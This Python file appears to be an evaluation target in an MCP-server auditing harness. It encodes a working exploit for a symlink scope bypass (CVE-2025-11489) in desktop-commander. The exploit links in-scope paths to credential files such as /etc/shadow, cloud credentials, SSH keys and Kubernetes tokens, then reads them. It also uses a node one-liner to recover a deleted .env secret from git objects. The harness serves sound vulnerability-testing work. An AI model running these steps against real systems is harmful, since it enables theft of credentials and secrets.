"""CVE-2025-11489: @wonderwhy-er/desktop-commander symlink scope bypass (CWE-59/CWE-61).

validatePath (src/tools/filesystem.ts) runs isPathAllowed on the unresolved path and only
afterwards calls fs.realpath, so an in-scope symlink whose target is outside the allowed directory
passes the scope check and read_file returns the out-of-scope target's bytes. The first patch 0.2.33
(a1177ec / PR #321) resolves the symlink with fs.realpath before the check and rejects it.

The layout is mounted read-write (filesystem_scope_env under a READ_WRITE host), so the exploit
creates the in-scope symlink itself through the server's own start_process tool (`ln -s`) and then
reads it: nothing is seeded inside the layout, which stays byte-for-byte universal.

The three deployment-layout places are kept too (the repository route check finds a route to each,
rule v11). bare-remote-url and workspace-dotenv are plain files out of scope (/srv/app.git/config,
/srv/.env), read straight through the symlink flaw. bare-history-env has no file: its nonce lives
only in a NUL-prefixed, zlib-compressed loose git object of /srv/app.git (the .env committed then
removed), and the image carries no git binary, so read_file cannot surface it from the coordinate
path. The exploit first inflates that object to an out-of-scope plaintext copy with the image's own
node runtime (start_process, the command_execution the target also reaches), then reads that copy
through the symlink flaw, blocked on the patched version like every other out-of-scope read.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_grammar import MechanismClass
from evals.cve_layout import ANCHOR_PATHS, PROJECT_BARE, WORKSPACE
from evals.cve_places import Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import LayoutMount
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from evals.holdout_environments import filesystem_scope_env
from mcp_auditor.domain.ports import MCPClientPort

WORKING_DIRECTORY = "/srv/app"  # the in-scope checkout and the scope the launch passes
# The read path the exploit sends matches this, and the benign in-scope read of /srv/app/.git/HEAD
# does not, so an accidental surfacing by the benign call cannot read as aimed.
AIM = re.compile(r"/srv/app/x\d+")

# Every file-kind place reachable_by arbitrary_read: a nonce file is planted at the coordinate and
# the exploit links an in-scope path to it, so the symlink read surfaces exactly these. One
# non-file place is kept too, container-hostname, whose nonce Docker writes to /etc/hostname (via
# --hostname); the exploit links an in-scope path to it, so the same symlink-follow read surfaces
# it, exactly as for etc-hosts. proc-environ (kind=env) is not kept: read_file refuses
# /proc/self/environ as a binary (NUL-separated) file. The three deployment-layout places are kept
# too (each routed repo-side, rule v11): bare-remote-url and workspace-dotenv read as plain
# out-of-scope files, bare-history-env through the inflated history copy (see _exploit).
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "container-hostname",
    "bare-remote-url",
    "bare-history-env",
    "workspace-dotenv",
)


# The out-of-scope plaintext copy the bare-history-env exploit inflates the git object to, one
# level above the /srv/app scope, and the node one-liner that writes it: no git binary in the
# image, so the committed-then-removed .env can only be reached by inflating the loose object with
# the image's own node runtime. Each loose object is zlib("<type> <len>\0<body>"); the exploit
# strips the header so the copy carries no NUL (read_file refuses a NUL file) and writes only the
# blob whose body names the dotenv key.
HISTORY_DUMP = f"{WORKSPACE}/.bare-history-env"
_DUMP_HISTORY = (
    'node -e \'const z=require("zlib"),fs=require("fs"),p=require("path");'
    f'const base="{PROJECT_BARE}/objects";'
    "for(const d of fs.readdirSync(base)){if(!/^[0-9a-f]{2}$/.test(d))continue;"
    "for(const f of fs.readdirSync(p.join(base,d))){try{"
    'const s=z.inflateSync(fs.readFileSync(p.join(base,d,f))).toString("latin1");'
    'const b=s.slice(s.indexOf("\\0")+1);'
    f'if(b.includes("DEPLOY_SECRET"))fs.writeFileSync("{HISTORY_DUMP}",b);'
    "}catch(e){}}}'"
)


def _coordinate_paths(places: Places, place_id: str) -> tuple[str, ...]:
    # The on-disk paths the real software writes the place's value to, which the exploit links an
    # in-scope path to. container-hostname surfaces through /etc/hostname (Docker fills it from
    # --hostname), as for the HOSTNAME-kind place in every read fixture. A layout place anchored on
    # a plain file reads from its anchor path; bare-history-env reads from the inflated copy.
    place = places[place_id]
    if place.kind is PlantKind.HOSTNAME:
        return ("/etc/hostname",)
    if place_id == "bare-history-env":
        return (HISTORY_DUMP,)
    coordinates = place.coordinates
    if coordinates.anchor is not None:
        return (f"{ANCHOR_PATHS[coordinates.anchor]}/{coordinates.relpath}",)
    raw = coordinates.paths if coordinates.paths is not None else (coordinates.path,)
    return tuple(
        resolve_container_path(path, WORKING_DIRECTORY) for path in raw if path is not None
    )


def _link_indices(places: Places, place_id: str) -> list[int]:
    # The flat enumeration of linked files (places in KEPT order, each coordinate path in order) so
    # an exploit's link name x<i> is the one it creates for its place.
    index = 0
    for current in KEPT_PLACES:
        paths = _coordinate_paths(places, current)
        if current == place_id:
            return list(range(index, index + len(paths)))
        index += len(paths)
    return []


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        if place_id == "bare-history-env":
            # Inflate the history blob to the out-of-scope copy before linking it (writeFileSync
            # emits nothing to stdout, so the nonce reaches no response until the symlink read).
            await client.call_tool("start_process", {"command": _DUMP_HISTORY, "timeout_ms": 5000})
        for index, target in zip(
            _link_indices(places, place_id), _coordinate_paths(places, place_id), strict=True
        ):
            link = f"{WORKING_DIRECTORY}/x{index}"
            await client.call_tool(
                "start_process", {"command": f"ln -s {target} {link}", "timeout_ms": 5000}
            )
            await client.call_tool("read_file", {"path": link})

    run.__name__ = f"read_{place_id.replace('-', '_')}"
    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # An in-scope, non-symlink read: succeeds on both versions, carries no nonce, not aimed.
    await client.call_tool("read_file", {"path": f"{WORKING_DIRECTORY}/.git/HEAD"})


TARGET = CVETarget(
    cve_id="CVE-2025-11489",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.READ_OUTSIDE_SCOPE, MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"arbitrary_read", "command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-11489-desktop-commander",),
    server_image="holdout-2025-11489-desktop-commander",
    patched_image="holdout-2025-11489-desktop-commander-patched",
    planting_host=PlantingHost(
        SymbolicUser.UNPRIVILEGED,
        WORKING_DIRECTORY,
        has_network=False,
        layout_mount=LayoutMount.READ_WRITE,
    ),
    builder=filesystem_scope_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Symlink scope bypass (CWE-59/CWE-61): validatePath checks isPathAllowed on the unresolved "
        "path before fs.realpath, so read_file follows an in-scope symlink to an out-of-scope "
        "target. The exploit places the link itself through start_process on the read-write layout."
    ),
    tools_filter=None,
)
